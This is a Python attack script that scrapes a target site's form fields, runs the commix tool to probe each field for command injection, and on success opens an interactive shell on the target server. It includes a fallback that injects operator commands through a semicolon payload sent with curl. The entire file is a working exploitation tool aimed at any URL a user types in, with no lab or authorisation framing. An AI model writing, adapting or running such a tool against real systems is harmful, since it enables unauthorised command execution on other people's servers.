import subprocess
from urllib.parse import urljoin
import re
import sys

def get_parameters(url):
    """Fetch URL content and extract parameters"""
    try:
        cmd = ['curl', '-s', '-L', url]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            print(f"[+] Successfully fetched content from: {url}")
            extract_form_details(url, result.stdout)
        else:
            print(f"[-] Curl failed with error: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        print(f"[-] Timeout while fetching {url}")
    except Exception as e:
        print(f"[-] Error: {e}")

def extract_form_details(base_url, html_content):
    """Extract form details and input parameters"""
    # Extract input fields
    input_pattern = r'<input[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*>'
    input_names = re.findall(input_pattern, html_content, re.IGNORECASE)
    
    all_params = list(set(input_names))  # Remove duplicates
    
    if all_params:
        print(f"[+] Parameters found: {', '.join(all_params)}")
        
        # Test each parameter for command injection
        for param_name in all_params:
            print(f"\n[*] Testing parameter: {param_name}")
            is_vulnerable = test_command_injections(base_url, param_name)
            
            if is_vulnerable:
                print(f"    ✅ CONFIRMED: {param_name} is VULNERABLE to command injection!")
                print(f"\n[*] Opening interactive shell...")
                open_interactive_shell(base_url, param_name)
                return  # Stop after first successful shell
            else:
                print(f"    ❌ {param_name} appears to be safe")
        
    else:
        print(f"[-] No input parameters found")
        # Test with common parameter names
        common_params = ['id', 'cmd', 'command', 'exec', 'query', 'search', 'file']
        print(f"[*] Testing common parameters: {common_params}")
        for param_name in common_params:
            if test_command_injections(base_url, param_name):
                open_interactive_shell(base_url, param_name)
                return

def test_command_injections(url, param_name, method="POST"):
    """Test command injection using commix"""
    try:
        command = [
            'commix', 
            '--url', url, 
            '--data', f'{param_name}=test',
            '--batch',
            '--level=2'
        ]
        
        print(f"    [*] Running commix scan...")
        
        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        output, error = process.communicate(input='u\nn\n', timeout=30)
        
        # Check for vulnerability indicators
        vulnerability_indicators = [
            'is vulnerable',
            'command injection',
            'exploitable',
            'injection point',
            'successfully exploited'
        ]
        
        for line in output.split('\n'):
            line_lower = line.lower()
            if any(indicator in line_lower for indicator in vulnerability_indicators):
                if not any(banner in line for banner in ['commix', 'copyright', 'legal disclaimer']):
                    return True
        
        return False
            
    except subprocess.TimeoutExpired:
        print(f"    [!] Timeout testing {param_name}")
        try:
            process.kill()
        except:
            pass
        return False
    except Exception as e:
        print(f"    [!] Error: {e}")
        return False

def open_interactive_shell(url, param_name):
    """Open an interactive shell using commix"""
    print(f"\n🎯 OPENING INTERACTIVE SHELL ON: {url}")
    print(f"🎯 USING PARAMETER: {param_name}")
    print("💡 Type commands to execute on the target server")
    print("💡 Type 'exit' or 'quit' to close the shell")
    print("💡 Press Ctrl+C to exit")
    print("=" * 50)
    
    try:
        # For older commix versions, use shell option
        command = [
            'commix',
            '--url', url,
            '--data', f'{param_name}=COMMAND',
            '--shell'
        ]
        
        print(f"[*] Starting commix with shell option...")
        subprocess.run(command)
        
    except KeyboardInterrupt:
        print(f"\n[!] Shell closed by user")
    except Exception as e:
        print(f"[!] Error opening shell: {e}")
        # Try alternative method
        try_alternative_shell(url, param_name)

def try_alternative_shell(url, param_name):
    """Alternative method to get shell using manual commands"""
    print(f"\n[*] Trying alternative method...")
    
    while True:
        try:
            cmd = input("shell> ").strip()
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            if not cmd:
                continue
                
            # Execute command via curl
            payload = f"{param_name}=google.com;{cmd};echo '---END---'"
            curl_cmd = ['curl', '-X', 'POST', url, '-d', payload, '-s']
            
            result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=10)
            
            # Extract command output
            output = result.stdout
            if '---END---' in output:
                # Extract only the command output
                lines = output.split('\n')
                in_output = False
                for line in lines:
                    if '---END---' in line:
                        break
                    if in_output:
                        print(line)
                    if 'Address:' in line or 'Server:' in line:
                        in_output = True
            else:
                print(output)
                
        except KeyboardInterrupt:
            print(f"\n[!] Exiting shell...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

def check_commix_version():
    """Check commix version and available options"""
    try:
        result = subprocess.run(['commix', '--help'], capture_output=True, text=True)
        help_text = result.stdout + result.stderr
        
        print("[*] Checking commix version and options...")
        
        if '--os-shell' in help_text:
            print("[+] --os-shell option available")
            return 'os-shell'
        elif '--shell' in help_text:
            print("[+] --shell option available") 
            return 'shell'
        else:
            print("[-] No shell options found, using manual method")
            return 'manual'
            
    except Exception as e:
        print(f"[-] Error checking commix version: {e}")
        return 'manual'

def main():
    """Main function to handle user input and execution"""
    target = input("Enter URL or IP Target: ").strip()
    
    if not target:
        print("[-] No target provided")
        return
        
    # Validate and format URL
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    print(f"[*] Starting scan for: {target}")
    print("[*] Looking for command injection to open shell...\n")
    
    # Check commix version first
    shell_method = check_commix_version()
    print(f"[*] Using shell method: {shell_method}\n")
    
    get_parameters(target)
    
    print(f"\n[*] Scan completed for: {target}")

if __name__ == "__main__":    
    main()